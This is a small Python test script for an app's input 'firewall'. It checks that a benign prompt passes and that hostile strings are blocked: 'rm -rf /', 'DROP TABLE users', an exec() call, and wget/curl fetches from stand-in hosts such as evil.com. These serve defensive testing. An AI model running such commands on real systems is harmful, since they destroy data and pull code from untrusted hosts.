"""
Conclik Pilot AI
Security Test
Firewall
"""

from app.security.firewall import firewall


TESTS = [
    ("Write a YouTube script about AI", True),
    ("rm -rf /", False),
    ("DROP TABLE users", False),
    ("exec(print('hello'))", False),
    ("wget https://evil.com", False),
    ("curl http://malicious.site", False),
]


def run():

    print("\n=== Firewall Test ===")

    passed = 0

    for prompt, expected in TESTS:

        result = firewall.inspect(prompt)

        status = "PASS" if result == expected else "FAIL"

        print(f"{status:5} | {prompt}")

        if status == "PASS":
            passed += 1

    print(f"\nResult : {passed}/{len(TESTS)} Passed")


if __name__ == "__main__":
    run()
